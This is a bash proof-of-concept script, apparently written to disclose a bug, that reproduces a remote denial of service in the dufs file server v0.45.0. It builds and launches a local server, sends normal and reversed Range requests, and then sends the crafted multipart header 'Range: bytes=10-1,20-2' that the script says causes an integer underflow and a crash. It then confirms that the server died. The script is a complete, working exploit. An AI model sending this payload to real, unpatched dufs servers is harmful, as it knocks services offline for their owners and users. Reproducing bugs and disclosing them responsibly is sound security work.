#!/bin/bash
set -e

# PoC: Integer Underflow in Multipart Range Parsing Allows Remote DoS via Memory Exhaustion
# Tested: dufs v0.45.0

ROOT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
HOST=${HOST:-127.0.0.1}
PORT=${PORT:-8888}
BIN=${BIN:-"$ROOT_DIR/target/release/dufs"}
TEST_ROOT=${TEST_ROOT:-"$ROOT_DIR/test_root"}
TARGET_FILE=${TARGET_FILE:-"$TEST_ROOT/test.txt"}
LOG_FILE=${LOG_FILE:-"$ROOT_DIR/dufs-poc-range-dos.log"}
PANIC_LOG=${PANIC_LOG:-"$ROOT_DIR/dufs-poc-range-dos.stderr.log"}
URL="http://$HOST:$PORT/$(basename "$TARGET_FILE")"

if [ ! -x "$BIN" ]; then
  echo "[+] release binary not found, building..."
  (cd "$ROOT_DIR" && cargo build --release)
fi

mkdir -p "$TEST_ROOT"

if [ ! -f "$TARGET_FILE" ] || [ "$(wc -c < "$TARGET_FILE")" -lt 1024 ]; then
  : > "$TARGET_FILE"
  i=0
  while [ "$i" -lt 300 ]; do
    printf 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n' >> "$TARGET_FILE"
    i=$((i + 1))
  done
fi

echo "[+] target file: $TARGET_FILE ($(wc -c < "$TARGET_FILE") bytes)"

cleanup() {
  if [ -n "${SERVER_PID:-}" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

rm -f "$PANIC_LOG"
"$BIN" "$TEST_ROOT" --port "$PORT" --log-file "$LOG_FILE" >/dev/null 2>"$PANIC_LOG" &
SERVER_PID=$!

sleep 1
if ! kill -0 "$SERVER_PID" 2>/dev/null; then
  echo "[-] server failed to start"
  exit 1
fi

echo "[+] server started: pid=$SERVER_PID, url=$URL"
echo

echo "[1/3] baseline request (normal range)"
curl -i -sS -H 'Range: bytes=0-9' "$URL" | sed -n '1,10p'
echo

echo "[2/3] reversed single range"
curl -i -sS -H 'Range: bytes=10-1' "$URL" | sed -n '1,10p'
echo

echo "[3/3] reversed multipart range (DoS trigger)"
set +e
CURL_OUT=$(curl -i -sS -H 'Range: bytes=10-1,20-2' "$URL" 2>&1)
CURL_RC=$?
set -e
printf '%s\n' "$CURL_OUT" | sed -n '1,30p'
echo "curl exit code: $CURL_RC"
echo

sleep 1
if kill -0 "$SERVER_PID" 2>/dev/null; then
  echo "[-] server is still alive; PoC did not crash this run"
  exit 1
fi

echo "[+] server crashed after crafted multipart range (PoC reproduced)"
if [ -s "$PANIC_LOG" ]; then
  echo "[+] panic stderr (tail):"
  tail -n 20 "$PANIC_LOG"
fi
